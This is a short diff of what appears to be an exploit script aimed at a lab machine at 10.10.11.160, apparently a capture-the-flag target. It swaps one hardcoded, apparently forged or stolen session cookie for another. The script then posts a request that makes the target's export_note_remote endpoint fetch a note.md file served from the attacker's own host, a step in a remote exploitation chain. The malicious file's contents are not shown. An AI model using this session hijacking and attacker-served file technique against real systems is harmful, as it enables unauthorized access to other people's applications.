@@ -31,7 +31,7 @@ def cmd():
     target = "http://10.10.11.160:5000/export_note_remote"
     data = "url=http://"
     note = ":6000/note.md"
-    headers = {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yne-gw.zGNrWtDKS5KwiL_dPe9sSOqG2A4", "Origin": "http://10.10.11.160:5000", "Referer": "http://10.10.11.160:5000/export_note", "Cache-Control": "max-age=0"}
+    headers = {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yqe56g.SYM1NcZo1P6yn4Fxrgua6KSqzQc", "Origin": "http://10.10.11.160:5000", "Referer": "http://10.10.11.160:5000/export_note", "Cache-Control": "max-age=0"}
     requests.post(target, data=data + ip + note, headers=headers, verify=False)
 
 threading.Thread(target=serr, args=()).start()
